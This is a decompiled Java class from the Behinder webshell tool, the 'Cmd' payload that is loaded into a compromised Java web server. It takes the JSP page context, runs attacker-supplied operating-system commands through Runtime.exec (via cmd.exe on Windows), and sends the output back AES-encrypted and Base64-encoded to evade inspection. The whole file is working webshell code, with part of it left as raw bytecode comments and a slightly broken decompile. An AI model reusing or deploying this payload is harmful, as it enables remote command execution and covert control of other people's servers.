 package net.rebeyond.behinder.payload.java;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.lang.reflect.Method;
 import java.nio.charset.Charset;
 import java.util.Map;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
 import javax.servlet.ServletRequest;
 import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpSession;
 
 public class Cmd
 {
   public static String cmd;
   private ServletRequest Request;
   private ServletResponse Response;
   private HttpSession Session;
   
   /* Error */
   public boolean equals(Object obj)
   {
     // Byte code:
     //   0: aload_1
     //   1: checkcast 24	javax/servlet/jsp/PageContext
     //   4: astore_2
     //   5: aload_0
     //   6: aload_2
     //   7: invokevirtual 26	javax/servlet/jsp/PageContext:getSession	()Ljavax/servlet/http/HttpSession;
     //   10: putfield 30	net/rebeyond/behinder/payload/java/Cmd:Session	Ljavax/servlet/http/HttpSession;
     //   13: aload_0
     //   14: aload_2
     //   15: invokevirtual 32	javax/servlet/jsp/PageContext:getResponse	()Ljavax/servlet/ServletResponse;
     //   18: putfield 36	net/rebeyond/behinder/payload/java/Cmd:Response	Ljavax/servlet/ServletResponse;
     //   21: aload_0
     //   22: aload_2
     //   23: invokevirtual 38	javax/servlet/jsp/PageContext:getRequest	()Ljavax/servlet/ServletRequest;
     //   26: putfield 42	net/rebeyond/behinder/payload/java/Cmd:Request	Ljavax/servlet/ServletRequest;
     //   29: aload_2
     //   30: invokevirtual 32	javax/servlet/jsp/PageContext:getResponse	()Ljavax/servlet/ServletResponse;
     //   33: ldc 44
     //   35: invokeinterface 46 2 0
     //   40: new 52	java/util/HashMap
     //   43: dup
     //   44: invokespecial 54	java/util/HashMap:<init>	()V
     //   47: astore_3
     //   48: aload_3
     //   49: ldc 55
     //   51: aload_0
     //   52: getstatic 57	net/rebeyond/behinder/payload/java/Cmd:cmd	Ljava/lang/String;
     //   55: invokespecial 59	net/rebeyond/behinder/payload/java/Cmd:RunCMD	(Ljava/lang/String;)Ljava/lang/String;
     //   58: invokeinterface 63 3 0
     //   63: pop
     //   64: aload_3
     //   65: ldc 69
     //   67: ldc 71
     //   69: invokeinterface 63 3 0
     //   74: pop
     //   75: goto +154 -> 229
     //   78: astore 4
     //   80: aload_3
     //   81: ldc 55
     //   83: aload 4
     //   85: invokevirtual 73	java/lang/Exception:getMessage	()Ljava/lang/String;
     //   88: invokeinterface 63 3 0
     //   93: pop
     //   94: aload_3
     //   95: ldc 69
     //   97: ldc 71
     //   99: invokeinterface 63 3 0
     //   104: pop
     //   105: aload_0
     //   106: getfield 36	net/rebeyond/behinder/payload/java/Cmd:Response	Ljavax/servlet/ServletResponse;
     //   109: invokeinterface 79 1 0
     //   114: astore 6
     //   116: aload 6
     //   118: aload_0
     //   119: aload_0
     //   120: aload_3
     //   121: iconst_1
     //   122: invokespecial 83	net/rebeyond/behinder/payload/java/Cmd:buildJson	(Ljava/util/Map;Z)Ljava/lang/String;
     //   125: ldc 44
     //   127: invokevirtual 87	java/lang/String:getBytes	(Ljava/lang/String;)[B
     //   130: invokespecial 93	net/rebeyond/behinder/payload/java/Cmd:Encrypt	([B)[B
     //   133: invokevirtual 97	javax/servlet/ServletOutputStream:write	([B)V
     //   136: aload 6
     //   138: invokevirtual 103	javax/servlet/ServletOutputStream:flush	()V
     //   141: aload 6
     //   143: invokevirtual 106	javax/servlet/ServletOutputStream:close	()V
     //   146: aload_2
     //   147: invokevirtual 109	javax/servlet/jsp/PageContext:getOut	()Ljavax/servlet/jsp/JspWriter;
     //   150: invokevirtual 113	javax/servlet/jsp/JspWriter:clear	()V
     //   153: goto +134 -> 287
     //   156: astore 6
     //   158: aload 6
     //   160: invokevirtual 118	java/lang/Exception:printStackTrace	()V
     //   163: goto +124 -> 287
     //   166: astore 5
     //   168: aload_0
     //   169: getfield 36	net/rebeyond/behinder/payload/java/Cmd:Response	Ljavax/servlet/ServletResponse;
     //   172: invokeinterface 79 1 0
     //   177: astore 6
     //   179: aload 6
     //   181: aload_0
     //   182: aload_0
     //   183: aload_3
     //   184: iconst_1
     //   185: invokespecial 83	net/rebeyond/behinder/payload/java/Cmd:buildJson	(Ljava/util/Map;Z)Ljava/lang/String;
     //   188: ldc 44
     //   190: invokevirtual 87	java/lang/String:getBytes	(Ljava/lang/String;)[B
     //   193: invokespecial 93	net/rebeyond/behinder/payload/java/Cmd:Encrypt	([B)[B
     //   196: invokevirtual 97	javax/servlet/ServletOutputStream:write	([B)V
     //   199: aload 6
     //   201: invokevirtual 103	javax/servlet/ServletOutputStream:flush	()V
     //   204: aload 6
     //   206: invokevirtual 106	javax/servlet/ServletOutputStream:close	()V
     //   209: aload_2
     //   210: invokevirtual 109	javax/servlet/jsp/PageContext:getOut	()Ljavax/servlet/jsp/JspWriter;
     //   213: invokevirtual 113	javax/servlet/jsp/JspWriter:clear	()V
     //   216: goto +10 -> 226
     //   219: astore 6
     //   221: aload 6
     //   223: invokevirtual 118	java/lang/Exception:printStackTrace	()V
     //   226: aload 5
     //   228: athrow
     //   229: aload_0
     //   230: getfield 36	net/rebeyond/behinder/payload/java/Cmd:Response	Ljavax/servlet/ServletResponse;
     //   233: invokeinterface 79 1 0
     //   238: astore 6
     //   240: aload 6
     //   242: aload_0
     //   243: aload_0
     //   244: aload_3
     //   245: iconst_1
     //   246: invokespecial 83	net/rebeyond/behinder/payload/java/Cmd:buildJson	(Ljava/util/Map;Z)Ljava/lang/String;
     //   249: ldc 44
     //   251: invokevirtual 87	java/lang/String:getBytes	(Ljava/lang/String;)[B
     //   254: invokespecial 93	net/rebeyond/behinder/payload/java/Cmd:Encrypt	([B)[B
     //   257: invokevirtual 97	javax/servlet/ServletOutputStream:write	([B)V
     //   260: aload 6
     //   262: invokevirtual 103	javax/servlet/ServletOutputStream:flush	()V
     //   265: aload 6
     //   267: invokevirtual 106	javax/servlet/ServletOutputStream:close	()V
     //   270: aload_2
     //   271: invokevirtual 109	javax/servlet/jsp/PageContext:getOut	()Ljavax/servlet/jsp/JspWriter;
     //   274: invokevirtual 113	javax/servlet/jsp/JspWriter:clear	()V
     //   277: goto +10 -> 287
     //   280: astore 6
     //   282: aload 6
     //   284: invokevirtual 118	java/lang/Exception:printStackTrace	()V
     //   287: iconst_1
     //   288: ireturn
     // Line number table:
     //   Java source line #28	-> byte code offset #0
     //   Java source line #29	-> byte code offset #5
     //   Java source line #30	-> byte code offset #13
     //   Java source line #31	-> byte code offset #21
     //   Java source line #32	-> byte code offset #29
     //   Java source line #33	-> byte code offset #40
     //   Java source line #35	-> byte code offset #48
     //   Java source line #36	-> byte code offset #64
     //   Java source line #38	-> byte code offset #75
     //   Java source line #39	-> byte code offset #80
     //   Java source line #40	-> byte code offset #94
     //   Java source line #46	-> byte code offset #105
     //   Java source line #47	-> byte code offset #116
     //   Java source line #48	-> byte code offset #136
     //   Java source line #49	-> byte code offset #141
     //   Java source line #50	-> byte code offset #146
     //   Java source line #51	-> byte code offset #153
     //   Java source line #53	-> byte code offset #158
     //   Java source line #43	-> byte code offset #166
     //   Java source line #46	-> byte code offset #168
     //   Java source line #47	-> byte code offset #179
     //   Java source line #48	-> byte code offset #199
     //   Java source line #49	-> byte code offset #204
     //   Java source line #50	-> byte code offset #209
     //   Java source line #51	-> byte code offset #216
     //   Java source line #53	-> byte code offset #221
     //   Java source line #55	-> byte code offset #226
     //   Java source line #46	-> byte code offset #229
     //   Java source line #47	-> byte code offset #240
     //   Java source line #48	-> byte code offset #260
     //   Java source line #49	-> byte code offset #265
     //   Java source line #50	-> byte code offset #270
     //   Java source line #51	-> byte code offset #277
     //   Java source line #53	-> byte code offset #282
     //   Java source line #56	-> byte code offset #287
     // Local variable table:
     //   start	length	slot	name	signature
     //   0	289	0	this	Cmd
     //   0	289	1	obj	Object
     //   4	267	2	page	javax.servlet.jsp.PageContext
     //   47	198	3	result	Map<String, String>
     //   78	6	4	e	Exception
     //   166	61	5	localObject	Object
     //   114	28	6	so	javax.servlet.ServletOutputStream
     //   156	3	6	e	Exception
     //   177	28	6	so	javax.servlet.ServletOutputStream
     //   219	3	6	e	Exception
     //   238	28	6	so	javax.servlet.ServletOutputStream
     //   280	3	6	e	Exception
     // Exception table:
     //   from	to	target	type
     //   48	75	78	java/lang/Exception
     //   105	153	156	java/lang/Exception
     //   48	105	166	finally
     //   168	216	219	java/lang/Exception
     //   229	277	280	java/lang/Exception
   }
   
   private String RunCMD(String cmd)
     throws Exception
   {
     Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));
     String result = "";
     if ((cmd != null) && (cmd.length() > 0)) { Process p;
       Process p;
       if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
         p = Runtime.getRuntime().exec(new String[] { "cmd.exe", "/c", cmd });
       } else {
         p = Runtime.getRuntime().exec(cmd);
       }
       BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GB2312"));
       String disr = br.readLine();
       while (disr != null) {
         result = result + disr + "\n";
         disr = br.readLine();
       }
       result = new String(result.getBytes(osCharset));
     }
     return result;
   }
   
   private byte[] Encrypt(byte[] bs) throws Exception {
     String key = this.Session.getAttribute("u").toString();
     byte[] raw = key.getBytes("utf-8");
     SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
     Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
     cipher.init(1, skeySpec);
     byte[] encrypted = cipher.doFinal(bs);
     return encrypted;
   }
   
   private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
     StringBuilder sb = new StringBuilder();
     String version = System.getProperty("java.version");
     sb.append("{");
     for (String key : entity.keySet())
     {
       sb.append("\"" + key + "\":\"");
       String value = ((String)entity.get(key)).toString();
       if (encode)
       {
         if (version.compareTo("1.9") >= 0)
         {
           getClass();Class Base64 = Class.forName("java.util.Base64");
           Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
           value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
         }
         else
         {
           getClass();Class Base64 = Class.forName("sun.misc.BASE64Encoder");
           Object Encoder = Base64.newInstance();
           value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
           value = value.replace("\n", "").replace("\r", "");
         }
       }
       
 
       sb.append(value);
       sb.append("\",");
     }
     if (sb.toString().endsWith(","))
       sb.setLength(sb.length() - 1);
     sb.append("}");
     return sb.toString();
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/payload/java/Cmd.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */